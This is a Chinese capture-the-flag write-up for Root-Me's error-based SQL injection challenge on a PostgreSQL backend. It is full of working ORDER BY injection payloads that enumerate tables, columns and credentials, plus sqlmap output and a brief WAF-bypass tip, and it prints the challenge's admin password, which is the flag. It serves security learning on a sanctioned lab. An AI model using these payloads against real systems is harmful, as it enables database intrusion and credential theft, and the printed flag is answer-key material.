## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[SQL injection - Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)] [[解题报告](https://exp-blog.com/safe/ctf/rootme/web-server/sqlinjection-error/)]

------


## 试错

提示是基于错误的 SQL 注入，就是我们要令 SQL 尽可能报错，通过错误找到有用的信息（即账号密码）进行登陆。

注入点其实不难找，多试几次就知道在这里（也只有这里）：

`http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=[注入点]`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/01.png)

从报错可以知道，注入点在 `order by` 后面，而且还写死了一列 `page`，导致可控的 payload 不多。

`SELECT * FROM contents order by page [注入点]`

> 注：表名 `contents` 不是注入点，若换了其他表名、或添加其他表，则不会触发这个页面请求。

在 order 后面随便增加一些列，如注入 `,aaa,bbb,ccc,ddd`，虽然得到异常信息，但不是很有用：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/02.png)

这里还可以利用 `order by` 的特性，直接利用列号代替列名，看看会有什么效果。

发现当注入的列号小于 3 的时候，如注入 `,1,2` ， SQL 是正常执行的：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/03.png)

但当注入的列号大于 3 的时候，如注入 `,3` ， SQL 则报错不存在这列，说明 `contents` 表只有两列：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/04.png)

由于其中一列是 `page` ，我猜测另一列是主键 `id` ，尝试注入 `,id,exp` ，蒙对了：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/05.png)

其实到此为止都没得到什么有用的信息，不过我在操作过程中发现，

注入单引号 `'` 和双引号 `"` 除了会引起 SQL 语法错误之外没什么用：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/06.png)
![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/07.png)

而只要注入内容中包含分号 `;` ，就必定会触发攻击检测： `attack detected` 。

说明这题 **不允许通过分号注入多条 SQL** ：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/08.png)

------------

## 确定数据库类型

> **为了方便构造 payload ，从这里开始使用 Burp Suite 工具**。

其实一般情况下，SQL 注入要找到有用信息，主要都是通过 `union` 或分号 `;` 横向查找系统表。

但是这题的注入点太蹊跷，在 `order by` 后面，而且 SQL 没有用括号包围，导致 `union` 失效。

而分号 `;` 则会直接被攻击检测系统拦截。由此看来只能另辟蹊径。

不过我在随便注入的时候发现，如果注入 `OR 1=1` ，会触发一个异常：

`ERROR:  argument of OR must be type boolean, not type character varying`

这个异常信息就很意思了，我搜索了一下，发现 `not type character varying` 是 **PostgreSql** 数据库特有关键字。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/09.png)


------------

## 通过 sqlmap 找到探针

> 注：PostgreSql 数据库，通常也简称为 pgsql 。

知道数据库类型，就可以针对性注入了。而对于 pgsql ，据我所知可以在 order by 后面注入的 payload 是不多的。

在这里可以借助 sqlmap 先找到探针。

如果 Burp Suite 已经加了 sqlmap 插件，可以直接把完整的 HTTP 请求发送到 sqlmap （注意这个请求的 URL 不要注入前面的其他东西，保持题目最原始的参数即可）：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/10.png)
![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/11.png)


这里记录了 sqlmap 的扫描结果：

```shell
S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552703940473.req
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.3.23#dev}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:39:03 /2019-03-16/

[10:39:03] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552703940473.req'
[10:39:04] [INFO] testing connection to the target URL
[10:39:05] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:39:05] [INFO] testing if the target URL content is stable
[10:39:06] [INFO] target URL content is stable
[10:39:06] [INFO] testing if GET parameter 'action' is dynamic
[10:39:06] [INFO] GET parameter 'action' appears to be dynamic
[10:39:07] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
[10:39:07] [INFO] testing for SQL injection on GET parameter 'action'
[10:39:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:39:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:39:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:39:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:39:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:39:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:39:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:39:21] [INFO] testing 'MySQL inline queries'
[10:39:22] [INFO] testing 'PostgreSQL inline queries'
[10:39:22] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:39:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:39:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:39:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:39:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[10:39:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:39:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:39:33] [INFO] testing 'Oracle AND time-based blind'
[10:39:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:40:01] [WARNING] GET parameter 'action' does not seem to be injectable
[10:40:01] [INFO] testing if GET parameter 'order' is dynamic
[10:40:02] [WARNING] GET parameter 'order' does not appear to be dynamic
[10:40:02] [INFO] heuristic (basic) test shows that GET parameter 'order' might be injectable (possible DBMS: 'PostgreSQL')
[10:40:03] [INFO] testing for SQL injection on GET parameter 'order'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:40:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:40:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:40:28] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:40:31] [WARNING] reflective value(s) found and filtering out
[10:41:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[10:41:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[10:41:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[10:41:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[10:41:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[10:41:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:41:54] [INFO] GET parameter 'order' appears to be 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' injectable
[10:41:54] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:41:55] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[10:41:55] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[10:41:56] [INFO] GET parameter 'order' is 'PostgreSQL error-based - ORDER BY, GROUP BY clause' injectable
[10:41:56] [INFO] testing 'PostgreSQL inline queries'
[10:41:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:41:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[10:41:57] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:41:58] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[10:41:58] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[10:41:59] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[10:41:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:42:02] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[10:42:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[10:42:03] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[10:42:04] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:42:04] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[10:42:09] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[10:42:09] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[10:42:10] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[10:42:10] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[10:42:11] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[10:42:11] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[10:42:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:42:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 373 HTTP(s) requests:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause
    Payload: action=contents&order=ASC,(SELECT (CASE WHEN (6759=6759) THEN 1 ELSE 1/(SELECT 0) END))

    Type: error-based
    Title: PostgreSQL error-based - ORDER BY, GROUP BY clause
    Payload: action=contents&order=ASC,(CAST((CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5026=5026) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)) AS NUMERIC))
---
[10:42:31] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx
back-end DBMS: PostgreSQL
[10:42:31] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'

[*] ending @ 10:42:31 /2019-03-16/
```

> 注：某些 CTF 平台会对 `sqlmap` 等工具进行 WAF 屏蔽，直接结果就是导致扫描失败，所以还是尽可能更多地总结自己 SQLi 的探针。不过即使被 WAF 还是有办法绕过的，例如利用 tamper，或直接找到源站 IP 。

通过 sqlmap 的扫描结果，可以知道这个确实是 PostgreSQL 数据库，且Web 框架是 Nginx 。

同时也发现了页面 [http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC](http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC) 其实是有两种注入方式的：


```sql
// 基于布尔盲注，探针是：
action=contents&order=ASC,(SELECT (CASE WHEN (6759=6759) THEN 1 ELSE 1/(SELECT 0) END))

// 基于错误注入，探针是
action=contents&order=
ASC,(CAST((CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5026=5026) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)) AS NUMERIC))
```

但既然题目是基于错误的 SQL 注入，布尔盲注的探针就先不管了。

我们尝试使用后一个探针，得到回显输出 `ERROR:  invalid input syntax for type numeric: "qvxbq1qxxbq"` 。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/12.png)

> 需知道探针并不能用来解决这个挑战，它最大的作用是对于我们构造 payload 具有指导性作用。

注意到回显输出中有一串字符串 `qbpzq1qjkqq` 其实就是这个探针控制得到的。

但是为什么会得到这个字符串？不妨来分析一下。这个探针看似复杂，其实十分简单，先拆解下结构：

```sql
ASC,(
  CAST(
        (
          CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113)
        )
        ||
        (
          SELECT (
            CASE WHEN (5026=5026) THEN 1 ELSE 0 END
          )
        )::text
        ||
        (
          CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)
        )
  AS NUMERIC)
)
```

这个探针结构有几个的 pgsql 语法点：

- `CAST(xxx AS NUMERIC)` 表示把 `xxx` 强制转换为 `NUMERIC` 数字类型
- `CHR(ASCII)` 实际上就是随机选的 ASCII 字符 （目的只是避免使用无法注入的引号）
- `||` 是拼接字符或字符串的操作符号 （不是 或运算）
- `(xxx)::text `表示把 `xxx` 强制转换成 `text` 文本类型（即字符串）
- `CASE WHEN` 不难理解就是条件运算符了

根据这几个语法点，不难知道：

- `SELECT` 前面的字符拼接，得到的字符串是 `qvxbq`
- `SELECT` 本身的条件运算，得到数字 `1` 且转换成字符串
- `SELECT` 后面的字符拼接，得到的字符串是 `qxxbq`
- 把这三部分拼接起来就是字符串 `qvxbq1qxxbq`
- `CAST` 尝试把字符串 `qvxbq1qxxbq` 转换成数字，于是抛出异常，而在异常中输出了这个字符串

简单来说，这个探针就是利用 `CAST` 强制类型转换失败抛出异常的原理，抛出我们想要的内容。

不难想象，如果 `SELECT` 的是数据库的其他信息，我们就能通过异常把这些信息抛到前端。

------------

## 构造通用 payload

由于探针太长了，不妨将其简化一下，使其更易于使用：`,(CAST(CHR(62)||([注入SQL]) AS NUMERIC))`

- 原本最开头的 `ASC` 可以不需要，因为排序默认就是 `ASC` （注意逗号 `,` 不能丢）
- 拼接 `CHR(62)||` 是确保 `CAST NUMERIC` 的必定是字符串，即必定报错抛出异常 （`CHR(62)` 是字符 `>`）
- `[注入SQL]` 就是我们控制查询数据库信息的 SQL ，要求返回值只有 1 个值（**准确而言是 1 行 1 列**，而不能是一张表）

------------

## 获取数据库信息

有了通用 payload ，我们就可以结合 pgsql 数据库的系统表或函数，构造针对性的 payload 去查询一些关键信息了。

例如要获取数据库版本：`,(CAST(CHR(62)||(SELECT VERSION()) AS NUMERIC))`

得到：PostgreSQL 9.3.20 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4, 64-bit

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/13.png)

又如要获取数据库名称：`,(CAST(CHR(62)||(SELECT CURRENT_DATABASE()) AS NUMERIC))`

得到：c_webserveur_34

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/14.png)

------------

## 寻找目标表

由于我们的目的是找到账号密码成功登陆，因此需要先找到记录账密的表。

在 pgsql 中，有一张固定的系统表 `pg_tables` 记录了所有库中所有表，其 [表结构](https://www.postgresql.org/docs/8.3/view-pg-tables.html) 为：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/15.png)

先构造这样的 payload 查看当前数据库表的数量，一共 60 张表：

`,(CAST(CHR(62)||(SELECT COUNT(1) FROM pg_tables) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/16.png)


从 `pg_tables` 的表结构可以知道其中一列是 `tablename` ，尝试构造这样的 payload 获得所有表名：

`,(CAST(CHR(62)||(SELECT tablename from pg_tables) AS NUMERIC))`

但是出错了，原因是构造的 SELECT 表达式返回的值不能超过 1 行。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/17.png)

在 payload 中添加 `LIMIT 1` 即可避免此异常：

`,(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1) AS NUMERIC))`

成功获得了第一张表名 `pg_statistic` 。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/18.png)



但 `LIMIT 1` 限制了每次都只能取到第一张表，又要怎样得到所有表名 ?

其实方法也有很多，例如利用偏移 `LIMIT 1 OFFSET k` ，只要把 `k` 从 0 枚举到 59 ，发起请求 60 次，即可得到全部 60 张表， payload 为：`,(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET k) AS NUMERIC))` （注意把 `k` 换成数字）。可以编程实现 `k` 值枚举，不过这里推荐使用 Burp Suite 的 Intruder 实现：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/19.png)

根据不同的 `k` 值获得的 60 张表名如下：

| k | tablename |
|:---:|:----------:|
| 0 | pg_statistic |
| 1 | pg_type |
| 2 | **m3mbr35t4bl3** |
| 3 | **contents** |
| 4 | pg_authid |
| 5 | pg_attribute |
| 6 | pg_proc |
| 7 | pg_class |
| 8 | pg_user_mapping |
| 9 | pg_constraint |
| 10 | pg_inherits |
| 11 | pg_index |
| 12 | pg_operator |
| 13 | pg_opfamily |
| 14 | pg_opclass |
| 15 | pg_am |
| 16 | pg_amop |
| 17 | pg_amproc |
| 18 | pg_language |
| 19 | pg_largeobject_metadata |
| 20 | pg_database |
| 21 | pg_rewrite |
| 22 | pg_trigger |
| 23 | pg_event_trigger |
| 24 | pg_description |
| 25 | pg_cast |
| 26 | pg_enum |
| 27 | pg_namespace |
| 28 | pg_conversion |
| 29 | pg_depend |
| 30 | pg_db_role_setting |
| 31 | pg_tablespace |
| 32 | pg_pltemplate |
| 33 | pg_auth_members |
| 34 | pg_shdepend |
| 35 | pg_shdescription |
| 36 | pg_ts_config |
| 37 | pg_ts_config_map |
| 38 | pg_ts_dict |
| 39 | pg_ts_parser |
| 40 | pg_ts_template |
| 41 | pg_extension |
| 42 | pg_foreign_data_wrapper |
| 43 | pg_foreign_server |
| 44 | pg_foreign_table |
| 45 | pg_default_acl |
| 46 | pg_seclabel |
| 47 | pg_shseclabel |
| 48 | pg_range |
| 49 | pg_largeobject |
| 50 | sql_implementation_info |
| 51 | sql_languages |
| 52 | sql_packages |
| 53 | sql_sizing |
| 54 | sql_sizing_profiles |
| 55 | pg_attrdef |
| 56 | pg_aggregate |
| 57 | sql_features |
| 58 | pg_collation |
| 59 | sql_parts |

很明显，所有 `pg_*` 和 `sql_*` 都是系统表，剩下两张表 `m3mbr35t4bl3` 和 `contents` 。

而 `contents` 是当前正在注入的表，前面试错的时候已经知道它只有两列 `id` 和 `page` ，从列名来看应该没有关键信息。因此真正存储关键数据的应该就是 `m3mbr35t4bl3` 表，所以接下来就是查询这张表的数据。

------------

## 获取目标表的表结构

先构造这样的 payload 查看 `m3mbr35t4bl3` 表的记录数，发现只有一行：

`,(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/20.png)


尝试构造 payload 直接读取这行数据：

`,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3) AS NUMERIC))`

但是又出错了，原因是构造的 SELECT 表达式返回的值除了不能超过 1 行，还不能超过 1 列。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/21.png)

但是我们不知道 `m3mbr35t4bl3` 表的列名，为此先要设法找到其列名。


在 pgsql 中，要查找一张表的所有列名，可以利用这样的 SQL ：

```sql
SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND relname = 'm3mbr35t4bl3'
```

但是我们无法注入这条 SQL ，原因是它的 WHERE 条件中存在引号，而引号在这题中被过滤了。

但不代表毫无办法，这里可以利用 `GROUP BY` 的两个特性：

- 与 `ORDER BY` 类似的， `GROUP BY` 同样可以使用列号代替列名
- 当 `SELECT *` 与 `GROUP BY` 一起使用时， `GROUP BY` 必须出现所有列名（或列号），否则 SQL 会报错


一开始因为不知道任何列名，所以首先可以构造这样的 payload ：

`,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/22.png)

从异常中抛出了其中一列的列名 `us3rn4m3_c0l` ，声称其未被包含在 `GROUP BY` 中。

由此我们得到了新的一列列名，利用之构造新的 payload 如下：

`,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/23.png)

这次又从异常中抛出了新的一列 `id`，利用之构造新的 payload 如下：

`,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/24.png)

再次从异常中得到新的一列 `p455w0rd_c0l`，利用之构造新的 payload 如下：

`,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/25.png)

继而从异常中得到新的一列 `em41l_c0l`，利用之构造新的 payload 如下：

`,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l, em41l_c0l) AS NUMERIC))`

这次报错信息变成了 `ERROR:  subquery must return only one column` 。

说明 `GROUP BY` 已经包含了所有列并查询了结果返回，但新返回值多于 1 列，所以使得我们的 payload 报错。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/26.png)

------------

## 获取目标表的表数据

至此我们已经知道了这些信息：

- 目标表的表名为 `m3mbr35t4bl3` （这变体可以的。。。members_table ??? ）
- 目标表一共只有 4 列：`id`, `em41l_c0l`, `us3rn4m3_c0l`, `p455w0rd_c0l` （这列名也太刻意了。。）
- 目标表只有一行数据

那么要获得表数据就很简单了。

如下构造查询 `id` 列数据的 payload，得到 `1` ：

`,(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/27.png)

如下构造查询 `em41l_c0l` 列数据的 payload，得到 `admin@localhost` ：

`,(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/28.png)

如下构造查询 `us3rn4m3_c0l` 列数据的 payload，得到 `admin` ：

`,(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/29.png)

如下构造查询 `p455w0rd_c0l` 列数据的 payload，得到 `1a2BdKT5DIx3qxQN3UaC` ：

`,(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/30.png)

------------

## 完成挑战

使用得到的账号 `admin` 和密码 `1a2BdKT5DIx3qxQN3UaC` 登陆，得知这个密码就是 flag，完成挑战：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/31.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
